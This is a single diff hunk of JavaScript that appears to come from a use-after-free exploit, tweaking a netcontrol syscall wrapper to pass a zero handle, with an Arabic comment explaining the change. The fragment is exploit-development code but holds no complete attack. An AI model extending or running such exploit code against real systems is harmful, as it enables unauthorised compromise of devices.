@@ -1444,7 +1444,8 @@ function remove_uaf_file() {
   }
 }
 function nc_call(cmd, buf, len) {
-  var ret = netcontrol(BigInt_Error, cmd, buf, len);
+  // بدل BigInt_Error استخدم 0 كـ handle/pid
+  var ret = netcontrol(new BigInt(0, 0), cmd, buf, len);
   log("[NETCONTROL] cmd=" + hex(cmd) +
       " len=" + len +
       " ret=" + ret);
